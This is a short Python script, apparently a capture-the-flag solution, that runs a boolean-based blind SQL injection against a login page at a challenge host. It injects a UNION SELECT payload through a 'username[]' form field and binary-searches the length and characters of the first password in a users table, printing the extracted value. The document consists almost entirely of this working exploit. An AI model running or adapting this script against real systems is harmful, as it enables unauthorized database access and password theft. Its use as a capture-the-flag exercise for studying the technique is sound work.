import requests

url = 'https://sao.h4ck3r.quest/login'
query = '( select password from users limit 1 )'

def is_success(bool):
    payload = {
        'username[]': f"'union select null, cast(({bool}) as text), '123.193.94.201' --",
        'password': '1'
    }
    res = requests.post(url, data=payload)
    return 'welcome' in str(res.content)

def guess_length(length):
    bool = f"length({query}) > {length}"
    return is_success(bool)

def guess_flag(index, ascii):
    bool = f"substr({query}, {index + 1}, 1) > '{ascii}'"
    return is_success(bool)

def get_length():
    min_len, max_len = 0, 100
    while max_len > min_len:
        length = max_len - (max_len -  min_len) // 2 
        if guess_length(length):
            min_len = length + 1
        else:
            max_len = length - 1
    return max_len

def get_flag(length):
    flag = ''
    for i in range(length):
        l, h = 0, 200000
        while h > l:
            mid = h - (h - l) // 2
            if guess_flag(i, chr(mid)):
                l = mid + 1
            else:
                h = mid - 1
        flag += chr(l + 1) if guess_flag(i, chr(l)) else chr(l)
        print(flag)
    return flag

# length = get_length()
length = 28
flag = get_flag(length)
